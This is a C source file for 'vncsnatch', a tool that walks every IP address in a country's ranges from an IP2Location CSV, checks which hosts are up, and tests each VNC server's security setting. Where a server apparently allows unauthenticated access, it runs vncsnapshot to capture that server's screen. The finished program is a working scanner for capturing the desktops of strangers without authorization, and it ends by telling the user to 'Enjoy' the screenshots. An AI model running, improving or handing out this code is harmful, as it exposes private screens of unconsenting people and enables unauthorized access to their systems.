#include "color_defs.h"
#include "file_utils.h"
#include "misc_utils.h"
#include "network_utils.h"
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <readline/history.h>
#include <readline/readline.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/capability.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#define TCP_PORT 5900

// ANSI color codes

/**
 * Prints the program banner to the console.
 *
 * @return Always returns 0.
 */
int print_banner() {
  printf(COLOR_CYAN
         "\n"
         "██╗   ██╗███╗   ██╗ ██████╗███████╗███╗   ██╗ █████╗ ████████╗ "
         "██████╗██╗  ██╗\n"
         "██║   ██║████╗  ██║██╔════╝██╔════╝████╗  "
         "██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║\n"
         "██║   ██║██╔██╗ ██║██║     ███████╗██╔██╗ ██║███████║   ██║   ██║    "
         " ███████║\n"
         "╚██╗ ██╔╝██║╚██╗██║██║     ╚════██║██║╚██╗██║██╔══██║   ██║   ██║    "
         " ██╔══██║\n"
         " ╚████╔╝ ██║ ╚████║╚██████╗███████║██║ ╚████║██║  ██║   ██║   "
         "╚██████╗██║  ██║\n"
         "  ╚═══╝  ╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    "
         "╚═════╝╚═╝  ╚═╝\n"
         "                                                                    "
         " " COLOR_MAGENTA "             by  \n\n" COLOR_RESET);
  return 0;
}

/**
 * Checks if a given command is available in the system's PATH.
 *
 * @param command The name of the command to check.
 * @return 1 if the command is found in the PATH, 0 otherwise.
 */
int is_command_in_path(const char *command) {
  char *path = getenv("PATH");
  if (path == NULL) {
    return 0;
  }

  char *path_dup = strdup(path);
  char *dir = strtok(path_dup, ":");
  while (dir != NULL) {
    char full_path[1024];
    snprintf(full_path, sizeof(full_path), "%s/%s", dir, command);
    if (access(full_path, X_OK) == 0) {
      free(path_dup);
      return 1;
    }
    dir = strtok(NULL, ":");
  }
  free(path_dup);
  return 0;
}

static int run_vncsnapshot(const char *ip_addr);

/**
 * Parses the CSV file and checks IP addresses within specified ranges.
 *
 * @param file_location The path to the CSV file.
 * @param country_code The country code to filter IP ranges.
 * @return The number of screenshots taken.
 */
int parse_and_check_ips(const char *file_location, const char *country_code) {
  char *line = (char *)malloc(1024 * sizeof(char));
  int num_shots = 0;
  int current_index = 0;
  FILE *file;
  FILE *index_file;

  file = fopen(file_location, "r");
  if (file == NULL) {
    perror(COLOR_RED "Failed to open file %s" COLOR_RESET);
    free(line);
    return 0;
  }

  while (fgets(line, 1024, file) != NULL) {
    char start_ip_str[20], end_ip_str[20], csv_country_code[3],
        country_name[50];
    int parsed = sscanf(line, "\"%19[^\"]\",\"%19[^\"]\",\"%2[^\"]\",\"%49[^\"]\"",
                        start_ip_str, end_ip_str, csv_country_code, country_name);
    if (parsed != 4) {
      continue;
    }

    if (strcmp(csv_country_code, country_code) != 0) {
      continue;
    }

    uint32_t start_ip = (uint32_t)strtoul(start_ip_str, NULL, 10);
    uint32_t end_ip = (uint32_t)strtoul(end_ip_str, NULL, 10);

    if (start_ip > end_ip) {
      continue;
    }

    uint32_t ip = start_ip;
    while (1) {
      struct in_addr ip_addr_struct;
      ip_addr_struct.s_addr = htonl(ip);
      char *ip_addr = inet_ntoa(ip_addr_struct);

      printf("Checking address %s:\n", ip_addr);
      int vncsnap_flag = 0;
      if (is_ip_up(ip_addr)) {
        vncsnap_flag = get_security(ip_addr);
        current_index++;
        index_file = fopen(".line", "w");
        if (index_file != NULL) {
          fprintf(index_file, "%d\n", current_index);
          fclose(index_file);
        }

        if (vncsnap_flag == 1) {
          printf("   - Getting screenshot...");
          if (run_vncsnapshot(ip_addr) == 0) {
            num_shots++;
            printf("done\n");
            fflush(stdout);
          } else {
            printf("failed\n");
          }
        }
      } else {
        printf("not online. Skipping!\n");
      }
      if (ip == end_ip) {
        break;
      }
      ip++;
    }
  }

  fclose(file);
  free(line);
  printf("Finished checking %d addresses resulting in %d screenshots\n",
         current_index, num_shots);
  return num_shots;
}

char *file_location = NULL;
char *country_code = NULL;
static int run_vncsnapshot(const char *ip_addr) {
  char target[32];
  char output[32];
  char *argv[] = {"vncsnapshot", "-allowblank", target, output, NULL};
  const int timeout_sec = 60;
  time_t start_time = time(NULL);

  if (snprintf(target, sizeof(target), "%s:0", ip_addr) >= (int)sizeof(target)) {
    return -1;
  }
  if (snprintf(output, sizeof(output), "%s.jpg", ip_addr) >= (int)sizeof(output)) {
    return -1;
  }

  pid_t pid = fork();
  if (pid < 0) {
    return -1;
  }
  if (pid == 0) {
    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
      dup2(devnull, STDOUT_FILENO);
      dup2(devnull, STDERR_FILENO);
      if (devnull > STDERR_FILENO) {
        close(devnull);
      }
    }
    execvp(argv[0], argv);
    _exit(127);
  }

  for (;;) {
    int status = 0;
    pid_t wait_result = waitpid(pid, &status, WNOHANG);
    if (wait_result == pid) {
      if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        return 0;
      }
      return -1;
    }
    if (wait_result == 0) {
      if (time(NULL) - start_time >= timeout_sec) {
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
        return -1;
      }
      usleep(100000);
      continue;
    }
    if (wait_result < 0 && errno == EINTR) {
      continue;
    }
    return -1;
  }
}

/**
 * Signal handler for cleaning up resources on SIGINT.
 *
 * @param signum The signal number.
 */
void handle_sigint(int signum) {
  fprintf(stderr,
          COLOR_RED "\nInterrupt received. Cleaning up...\n" COLOR_RESET);
  if (file_location) {
    rl_clear_history();
    free(file_location);
  }
  if (country_code) {
    free(country_code);
  }
  exit(1);
}

/**
 * Main function to execute the program.
 *
 * @return Exit status of the program.
 */
int main() {
  // handle ctrl-c
  signal(SIGINT, handle_sigint);
  // print ansi banner
  //
  print_banner();

  if (!has_required_capabilities()) {
    fprintf(
        stderr, COLOR_RED
        "Warning!:\nThe program does not have the required "
        "capabilities or is not run by root.\n To set capabilities use:\n - "
        "sudo setcap cap_net_admin,cap_net_raw=eip vncsnatch\n\n" COLOR_RESET);
    fprintf(stderr, COLOR_RED "Without this, the IP check will be slow as we "
                              "cannot just ping it.\n\n" COLOR_RESET);
  }
  country_code = (char *)malloc(5 * sizeof(char));

  if (!is_command_in_path("vncsnapshot")) {
    fprintf(stderr, COLOR_RED
            "Error: vncsnapshot is not in the PATH. Please install it "
            "and ensure it is accessible.\n" COLOR_RESET);
    free(country_code);
    return 1;
  }
  printf("Please enter the country code to filter by (e.g., AU): ");
  if (fgets(country_code, 3, stdin) == NULL) {
    fprintf(stderr, COLOR_RED "Error reading country code.\n" COLOR_RESET);
    free(country_code);
    return 1;
  }
  country_code[strcspn(country_code, "\n")] = '\0';
  printf("Please enter full file path to the CSV file from "
         "IP2Location.com.\nIt can be downloaded from "
         "https://download.ip2location.com/lite/"
         "\n\nFull path: ");
  file_location = readline("==>");
  if (file_location == NULL || strlen(file_location) == 0) {
    fprintf(stderr, COLOR_RED "Error reading user input.\n" COLOR_RESET);
    if (file_location)
      free(file_location);
    if (country_code)
      free(country_code);
    return 1;
  }

  char *cleaned_file_location = clean_file_location(file_location);
  if (!cleaned_file_location) {
    fprintf(stderr, COLOR_RED "Error cleaning file location.\n" COLOR_RESET);
    if (file_location)
      free(file_location);
    if (country_code)
      free(country_code);
    return 1;
  }

  int num_shots = parse_and_check_ips(cleaned_file_location, country_code);
  printf(COLOR_GREEN
         "\nAll done. Enjoy %d new screenshots in this folder\n" COLOR_RESET,
         num_shots);

  if (file_location)
    free(file_location);
  if (cleaned_file_location)
    free(cleaned_file_location);
  if (country_code)
    free(country_code);
  return 0;
}
